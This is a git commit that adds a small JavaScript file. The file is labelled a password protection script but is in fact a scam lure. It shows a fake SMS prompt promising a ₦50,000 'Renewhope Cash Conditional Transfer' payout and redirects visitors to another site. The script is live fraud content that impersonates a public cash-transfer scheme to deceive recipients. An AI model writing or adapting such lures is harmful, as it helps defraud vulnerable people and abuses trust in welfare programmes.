7ee913b0ad2a1d47dc5b6dbc2adf75edee72754c
itidnewblog3 <ukpehaitid1@gmail.com>
2025-10-29 08:54:57 +0100

    Create fg-active.js

---
+++ fg-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦50,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the ₦50,000 Renewhope Cash Conditional Transfer. Please press OK to withdraw CASH now.',
+  'WITHDRAW ₦50,000'
+);
+if (password != 'WITHDRAW ₦50,000') {
+  location.href = 'https://lhegit.org/ncto.html';
+}
